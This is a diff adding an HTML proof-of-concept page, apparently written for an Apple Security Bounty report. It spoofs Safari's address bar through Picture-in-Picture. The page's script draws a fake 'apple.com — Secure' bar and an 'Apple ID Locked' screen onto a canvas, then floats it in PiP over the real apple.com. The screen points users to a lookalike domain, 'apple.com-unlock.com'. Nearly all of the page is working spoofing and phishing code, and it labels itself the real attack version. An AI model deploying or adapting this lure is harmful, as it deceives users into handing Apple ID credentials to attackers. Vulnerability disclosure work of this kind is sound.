@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC FINAL V5.1 CLEAN - Apple ID - No Origin Footer</title>
+<style>
+  body{margin:0;background:#f2f2f2;color:#000;font-family:-apple-system,sans-serif;padding:12px;text-align:center}
+  .box{max-width:960px;margin:0 auto;background:#000;border:2px solid #333;border-radius:14px;overflow:hidden}
+  canvas{width:100%;display:block}
+  video{width:100%;display:block;border:3px solid #0a84ff;border-radius:12px;margin-top:10px;background:#000}
+  button{font-size:17px;padding:18px 20px;margin:10px 0;width:100%;max-width:500px;border-radius:14px;border:none;font-weight:800;cursor:pointer}
+  .b1{background:#0a84ff;color:#fff;font-size:19px}
+  .b2{background:#1c1c1e;color:#fff;border:2px solid #555}
+  .log{font-family:Menlo,monospace;font-size:11px;color:#0f0;background:#111;padding:12px;border-radius:10px;text-align:left;margin-top:12px;white-space:pre-wrap;max-width:960px;margin:0 auto}
+  .note{background:#e7f3ff;border:1px solid #2196F3;padding:10px;margin:12px auto;max-width:960px;text-align:left}
+</style>
+</head>
+<body>
+<h3>FINAL V5.1 CLEAN - Safari PiP Spoof - No Origin Footer</h3>
+<div class="note"><b>For Apple Security Bounty:</b> This CLEAN version shows ONLY fake apple.com — no real origin text. Real origin https://bonex1927.github.io is hidden by Safari PiP UI. This is the real attack version.</div>
+<div class="box">
+  <canvas id="c" width="960" height="540"></canvas>
+  <video id="v" playsinline webkit-playsinline muted controls autoplay></video>
+</div>
+<button class="b1" onclick="initAndPiP()">1. Activate PiP - Fake apple.com</button>
+<button class="b2" onclick="openApple()">2. Open apple.com (real) - PiP persists</button>
+<div class="log" id="log">Log: ready</div>
+<script>
+var c=document.getElementById('c'), ctx=c.getContext('2d'), v=document.getElementById('v');
+var logEl=document.getElementById('log'); var stream=null;
+function log(t){ logEl.textContent += "\n"+new Date().toLocaleTimeString()+" - "+t; }
+function roundRect(x,y,w,h,r){ ctx.beginPath(); ctx.moveTo(x+r,y); ctx.lineTo(x+w-r,y); ctx.quadraticCurveTo(x+w,y,x+w,y+r); ctx.lineTo(x+w,y+h-r); ctx.quadraticCurveTo(x+w,y+h,x+w-r,y+h); ctx.lineTo(x+r,y+h); ctx.quadraticCurveTo(x,y+h,x,y+h-r); ctx.lineTo(x,y+r); ctx.quadraticCurveTo(x,y,x+r,y); ctx.closePath(); ctx.fill(); }
+function draw(){
+  ctx.fillStyle='#fff'; ctx.fillRect(0,0,960,540);
+  ctx.fillStyle='#f5f5f7'; ctx.fillRect(0,0,960,90);
+  ctx.fillStyle='#fff'; roundRect(12,14,936,62,31);
+  ctx.fillStyle='#1d1d1f'; ctx.font='bold 26px -apple-system,sans-serif'; ctx.textAlign='left'; ctx.fillText('🔒',30,56);
+  ctx.fillStyle='#06c'; ctx.font='bold 22px -apple-system,sans-serif'; ctx.fillText('apple.com',70,56);
+  ctx.fillStyle='#86868b'; ctx.font='16px -apple-system,sans-serif'; ctx.fillText(' — Secure',190,56);
+  ctx.fillStyle='#d2d2d7'; ctx.fillRect(0,90,960,2);
+  ctx.fillStyle='#f5f5f7'; ctx.fillRect(0,92,960,448);
+  ctx.fillStyle='#000'; ctx.font='bold 48px -apple-system,sans-serif'; ctx.textAlign='center'; ctx.fillText('',480,150);
+  ctx.fillStyle='#1d1d1f'; ctx.font='bold 28px -apple-system,sans-serif'; ctx.fillText('Apple ID Locked',480,190);
+  ctx.fillStyle='#515154'; ctx.font='16px -apple-system,sans-serif'; ctx.fillText('For your security, your Apple ID has been locked',480,218); ctx.fillText('due to suspicious activity.',480,238);
+  ctx.fillStyle='#fff'; roundRect(180,260,600,200,18); ctx.strokeStyle='#d2d2d7'; ctx.lineWidth=1; ctx.stroke();
+  ctx.fillStyle='#1d1d1f'; ctx.font='bold 17px -apple-system,sans-serif'; ctx.textAlign='left'; ctx.fillText('To unlock, please verify at:',200,290);
+  ctx.fillStyle='#06c'; ctx.font='bold 20px Menlo,monospace'; ctx.fillText('apple.com-unlock.com',200,320);
+  ctx.fillStyle='#86868b'; ctx.font='13px -apple-system,sans-serif'; ctx.fillText('This will open in a new tab after verification',200,344);
+  ctx.fillStyle='#0071e3'; roundRect(200,360,560,44,22); ctx.fillStyle='#fff'; ctx.font='bold 17px -apple-system,sans-serif'; ctx.textAlign='center'; ctx.fillText('Unlock Apple ID',480,388);
+  requestAnimationFrame(draw);
+}
+draw();
+function initAndPiP(){
+  try{
+    if(!stream){ if(c.captureStream) stream=c.captureStream(30); else if(c.webkitCaptureStream) stream=c.webkitCaptureStream(30); v.srcObject=stream; v.muted=true; }
+    v.play().then(()=>{ if(v.webkitSetPresentationMode){ v.webkitSetPresentationMode('picture-in-picture'); log("PiP SUCCESS - No real origin shown, only fake apple.com"); } else if(v.requestPictureInPicture){ v.requestPictureInPicture(); } }).catch(e=>log(e));
+  }catch(e){ log(e); }
+}
+function openApple(){ window.open('https://apple.com','_blank'); log("Opened real apple.com - Fake PiP persists on top"); }
+</script>
+</body>
+</html>
